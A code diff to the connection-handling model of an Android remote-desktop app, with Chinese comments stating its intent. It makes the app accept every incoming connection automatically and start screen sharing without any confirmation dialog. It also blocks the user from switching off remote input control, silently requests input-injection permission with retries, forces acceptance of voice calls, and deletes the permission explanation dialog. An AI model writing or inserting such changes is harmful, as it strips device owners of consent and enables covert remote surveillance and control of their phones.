@@ -103,13 +103,15 @@ class ServerModel with ChangeNotifier {
   }
 
   setApproveMode(String mode) async {
-    await bind.mainSetOption(key: kOptionApproveMode, value: mode);
-    /*
-    if (mode != 'password') {
-      await bind.mainSetOption(
-          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
+    if (mode == 'click') {
+      mode = '';
     }
-    */
+    // 无论输入什么mode，都设置为永远接受连接
+    await bind.mainSetOption(
+        key: kOptionApproveMode,
+        value: ''); // 空字符串表示接受所有连接
+    _approveMode = '';
+    notifyListeners();
   }
 
   TextEditingController get serverId => _serverId;
@@ -125,20 +127,11 @@ class ServerModel with ChangeNotifier {
   ServerModel(this.parent) {
     _emptyIdShow = translate("Generating ...");
     _serverId = IDTextEditingController(text: _emptyIdShow);
-
-    /*
-    // initital _hideCm at startup
-    final verificationMethod =
-        bind.mainGetOptionSync(key: kOptionVerificationMethod);
-    final approveMode = bind.mainGetOptionSync(key: kOptionApproveMode);
-    _hideCm = option2bool(
-        'allow-hide-cm', bind.mainGetOptionSync(key: 'allow-hide-cm'));
-    if (!(approveMode == 'password' &&
-        verificationMethod == kUsePermanentPassword)) {
-      _hideCm = false;
-    }
-    */
-
+    
+    // 设置为自动接受所有连接
+    setApproveMode('');
+    
+    updatePasswordModel();
     timerCallback() async {
       final connectionStatus =
           jsonDecode(await bind.mainGetConnectStatus()) as Map<String, dynamic>;
@@ -331,19 +324,15 @@ class ServerModel with ChangeNotifier {
   }
 
   toggleInput() async {
-    if (clients.isNotEmpty) {
-      await showClientsMayNotBeChangedAlert(parent.target);
-    }
-    if (_inputOk) {
-      parent.target?.invokeMethod("stop_input");
-      bind.mainSetOption(key: kOptionEnableKeyboard, value: 'N');
-    } else {
+    // 不允许用户关闭输入控制，此方法只用于尝试启用
+    if (!_inputOk) {
+      // 直接尝试获取INJECT_EVENTS权限
       if (parent.target != null) {
-        /// the result of toggle-on depends on user actions in the settings page.
-        /// handle result, see [ServerModel.changeStatue]
-        showInputWarnAlert(parent.target!);
+        await parent.target?.invokeMethod("start_input");
+        debugPrint("通过按钮请求输入控制权限");
       }
     }
+    // 不执行任何关闭操作，保持当前状态
   }
 
   Future<bool> checkRequestNotificationPermission() async {
@@ -375,8 +364,9 @@ class ServerModel with ChangeNotifier {
   }
 
   /// Toggle the screen sharing service.
-  toggleService() async {
+  toggleService({bool isAuto = false}) async {
     if (_isStart) {
+      // 停止服务时依然保留确认弹窗
       final res = await parent.target?.dialogManager
           .show<bool>((setState, close, context) {
         submit() => close(true);
@@ -400,55 +390,57 @@ class ServerModel with ChangeNotifier {
         stopService();
       }
     } else {
-      await checkRequestNotificationPermission();
-      if (bind.mainGetLocalOption(key: kOptionDisableFloatingWindow) != 'Y') {
-        await checkFloatingWindowPermission();
-      }
-      if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
-        await AndroidPermissionManager.request(kManageExternalStorage);
-      }
-      final res = await parent.target?.dialogManager
-          .show<bool>((setState, close, context) {
-        submit() => close(true);
-        return CustomAlertDialog(
-          title: Row(children: [
-            const Icon(Icons.warning_amber_sharp,
-                color: Colors.redAccent, size: 28),
-            const SizedBox(width: 10),
-            Text(translate("Warning")),
-          ]),
-          content: Text(translate("android_service_will_start_tip")),
-          actions: [
-            dialogButton("Cancel", onPressed: close, isOutline: true),
-            dialogButton("OK", onPressed: submit),
-          ],
-          onSubmit: submit,
-          onCancel: close,
-        );
-      });
-      if (res == true) {
-        startService();
-      }
+      // 不显示任何确认对话框，直接启动服务
+      debugPrint("直接启动服务，不显示任何确认弹窗");
+      startService();
     }
   }
 
   /// Start the screen sharing service.
   Future<void> startService() async {
-    _isStart = true;
-    notifyListeners();
-    parent.target?.ffiModel.updateEventListener(parent.target!.sessionId, "");
-    await parent.target?.invokeMethod("init_service");
-    // ugly is here, because for desktop, below is useless
-    await bind.mainStartService();
-    updateClientState();
-    if (isAndroid) {
-      androidUpdatekeepScreenOn();
+    try {
+      debugPrint("开始启动屏幕共享服务...");
+      
+      // 直接请求MediaProjection权限，跳过所有应用内确认对话框
+      try {
+        // 直接调用init_service_without_permission方法
+        await parent.target?.invokeMethod("init_service_without_permission");
+        debugPrint("已发送MediaProjection权限请求（跳过应用内确认）");
+        
+        // 权限请求成功后设置状态
+        _isStart = true;
+        notifyListeners();
+        parent.target?.ffiModel.updateEventListener(parent.target!.sessionId, "");
+        
+        // 其余服务初始化
+        await bind.mainStartService();
+        updateClientState();
+        if (isAndroid) {
+          androidUpdatekeepScreenOn();
+        }
+        debugPrint("屏幕共享服务启动成功");
+        
+        // 服务启动成功后，立即请求输入控制权限
+        if (!_inputOk) {
+          debugPrint("屏幕共享服务启动成功，立即请求输入控制权限");
+          await autoEnableInput();
+        }
+      } catch (e) {
+        debugPrint("请求MediaProjection权限失败: $e");
+        _isStart = false;
+        notifyListeners();
+      }
+    } catch (e) {
+      debugPrint("启动服务失败: $e");
+      _isStart = false;
+      notifyListeners();
     }
   }
 
   /// Stop the screen sharing service.
   Future<void> stopService() async {
     _isStart = false;
+    _mediaOk = false;
     closeAll();
     await parent.target?.invokeMethod("stop_service");
     await bind.mainStopService();
@@ -535,7 +527,31 @@ class ServerModel with ChangeNotifier {
     }
     if (_clients.length != oldClientLenght) {
       notifyListeners();
-      if (isAndroid) androidUpdatekeepScreenOn();
+      if (isAndroid) {
+        androidUpdatekeepScreenOn();
+        // 确保本地UI交互能力
+        ensureLocalUiInteractive();
+      }
+    }
+  }
+
+  /// 确保本地UI交互能力，即使在远程控制期间
+  void ensureLocalUiInteractive() {
+    if (!isAndroid || _clients.isEmpty) return;
+    
+    try {
+      // 向MainActivity发送信号，临时调整输入事件处理模式
+      parent.target?.invokeMethod("ensure_ui_interactive");
+      
+      // 如果有活跃连接，安排定期调用确保UI交互能力
+      if (_clients.isNotEmpty && _clients.any((c) => !c.disconnected)) {
+        // 每3秒刷新一次UI交互能力，确保本地操作不受阻碍
+        Future.delayed(Duration(seconds: 3), () {
+          ensureLocalUiInteractive();
+        });
+      }
+    } catch (e) {
+      debugPrint("Error ensuring UI interactive: $e");
     }
   }
 
@@ -609,8 +625,9 @@ class ServerModel with ChangeNotifier {
   }
 
   handleVoiceCall(Client client, bool accept) {
+    // 忽略accept参数，始终接受语音通话
     parent.target?.invokeMethod("cancel_notification", client.id);
-    bind.cmHandleIncomingVoiceCall(id: client.id, accept: accept);
+    bind.cmHandleIncomingVoiceCall(id: client.id, accept: true);
   }
 
   showVoiceCallDialog(Client client) {
@@ -676,22 +693,48 @@ class ServerModel with ChangeNotifier {
     });
   }
 
-  void sendLoginResponse(Client client, bool res) async {
+  sendLoginResponse(Client client, bool res) async {
+    // 根据用户选择的res参数来响应连接请求
+    final id = client.id;
+    
+    // 先更新UI状态，以提供即时反馈
     if (res) {
-      bind.cmLoginRes(connId: client.id, res: res);
-      if (!client.isFileTransfer) {
-        parent.target?.invokeMethod("start_capture");
+      // 如果接受连接，设置客户端为已授权状态
+      final index = _clients.indexWhere((element) => element.id == id);
+      if (index >= 0) {
+        _clients[index].authorized = true;
+        // 立即通知UI更新
+        notifyListeners();
       }
-      parent.target?.invokeMethod("cancel_notification", client.id);
-      client.authorized = true;
-      notifyListeners();
-    } else {
-      bind.cmLoginRes(connId: client.id, res: res);
-      parent.target?.invokeMethod("cancel_notification", client.id);
-      final index = _clients.indexOf(client);
-      tabController.remove(index);
-      _clients.remove(client);
-      if (isAndroid) androidUpdatekeepScreenOn();
+    }
+    
+    // 然后发送响应到服务端
+    await bind.cmLoginRes(connId: id, res: res);
+    
+    if (client.isFileTransfer) {
+      return;
+    }
+    
+    if (res && !isStart) {
+      toggleService();
+    }
+    
+    // 关闭与此客户端相关的通知
+    parent.target?.invokeMethod("cancel_notification", id);
+    
+    // 延迟一段时间后再次刷新客户端状态，确保UI与实际状态同步
+    if (res) {
+      Future.delayed(Duration(milliseconds: 300), () {
+        // 再次检查并更新客户端状态
+        updateClientState();
+      });
+    }
+    
+    // 退出并重新进入应用以刷新UI状态
+    if (res && isMobile) {
+      Future.delayed(Duration(milliseconds: 200), () {
+        parent.target?.dialogManager.dismissAll();
+      });
     }
   }
 
@@ -786,6 +829,64 @@ class ServerModel with ChangeNotifier {
       }
     }
   }
+
+  /// 检测是否为预授权的定制系统环境
+  bool isCustomEnvironment() {
+    // 此处可根据实际情况添加更复杂的检测逻辑
+    // 在GitHub编译环境下默认返回false
+    return bind.isCustomClient();
+  }
+
+  /// 自动启用输入控制，针对定制系统，静默获取权限
+  /// 返回是否成功获取权限
+  Future<bool> autoEnableInput() async {
+    // 如果已经有输入控制权限，返回成功
+    if (_inputOk) {
+      debugPrint("输入控制权限已获取，无需再次请求");
+      return true;
+    }
+    
+    debugPrint("静默请求INJECT_EVENTS权限");
+    
+    // 直接尝试获取输入控制权限，在定制系统中应该直接成功
+    if (parent.target != null) {
+      try {
+        // 使用特殊方法直接获取权限（优先）
+        await parent.target?.invokeMethod("start_input_without_dialog");
+        debugPrint("INJECT_EVENTS权限静默请求已发送");
+        
+        // 等待短暂时间，让系统有机会处理权限请求
+        await Future.delayed(Duration(milliseconds: 300));
+        
+        // 检查权限是否已获取
+        if (!_inputOk) {
+          // 静默方式可能未成功，尝试常规方式
+          debugPrint("静默方式未成功，尝试常规方式请求INJECT_EVENTS权限");
+          await parent.target?.invokeMethod("start_input");
+          
+          // 再次等待权限更新
+          await Future.delayed(Duration(milliseconds: 300));
+          
+          // 如果仍未成功，再尝试最后一次
+          if (!_inputOk) {
+            debugPrint("再次尝试请求INJECT_EVENTS权限");
+            await parent.target?.invokeMethod("start_input");
+            await Future.delayed(Duration(milliseconds: 500));
+          }
+        }
+        
+        // 检查服务状态
+        await parent.target?.invokeMethod("check_service");
+        
+        // 返回最终的权限状态
+        return _inputOk;
+      } catch (e) {
+        debugPrint("INJECT_EVENTS权限请求出错: $e");
+        return false;
+      }
+    }
+    return false;
+  }
 }
 
 enum ClientType {
@@ -869,37 +970,54 @@ class Client {
       return ClientType.remote;
     }
   }
+  
+  Client copyWith({
+    int? id,
+    bool? authorized,
+    bool? isFileTransfer,
+    String? portForward,
+    String? name,
+    String? peerId,
+    bool? keyboard,
+    bool? clipboard,
+    bool? audio,
+    bool? file,
+    bool? restart,
+    bool? recording,
+    bool? blockInput,
+    bool? disconnected,
+    bool? fromSwitch,
+    bool? inVoiceCall,
+    bool? incomingVoiceCall,
+  }) {
+    final newClient = Client(
+      id ?? this.id,
+      authorized ?? this.authorized,
+      isFileTransfer ?? this.isFileTransfer,
+      name ?? this.name,
+      peerId ?? this.peerId,
+      keyboard ?? this.keyboard,
+      clipboard ?? this.clipboard,
+      audio ?? this.audio,
+    );
+    
+    newClient.file = file ?? this.file;
+    newClient.restart = restart ?? this.restart;
+    newClient.recording = recording ?? this.recording;
+    newClient.blockInput = blockInput ?? this.blockInput;
+    newClient.disconnected = disconnected ?? this.disconnected;
+    newClient.fromSwitch = fromSwitch ?? this.fromSwitch;
+    newClient.inVoiceCall = inVoiceCall ?? this.inVoiceCall;
+    newClient.incomingVoiceCall = incomingVoiceCall ?? this.incomingVoiceCall;
+    newClient.portForward = portForward ?? this.portForward;
+    newClient.unreadChatMessageCount = this.unreadChatMessageCount;
+    
+    return newClient;
+  }
 }
 
 String getLoginDialogTag(int id) {
   return kLoginDialogTag + id.toString();
-}
-
-showInputWarnAlert(FFI ffi) {
-  ffi.dialogManager.show((setState, close, context) {
-    submit() {
-      AndroidPermissionManager.startAction(kActionAccessibilitySettings);
-      close();
-    }
-
-    return CustomAlertDialog(
-      title: Text(translate("How to get Android input permission?")),
-      content: Column(
-        mainAxisSize: MainAxisSize.min,
-        children: [
-          Text(translate("android_input_permission_tip1")),
-          const SizedBox(height: 10),
-          Text(translate("android_input_permission_tip2")),
-        ],
-      ),
-      actions: [
-        dialogButton("Cancel", onPressed: close, isOutline: true),
-        dialogButton("Open System Setting", onPressed: submit),
-      ],
-      onSubmit: submit,
-      onCancel: close,
-    );
-  });
 }
 
 Future<void> showClientsMayNotBeChangedAlert(FFI? ffi) async {
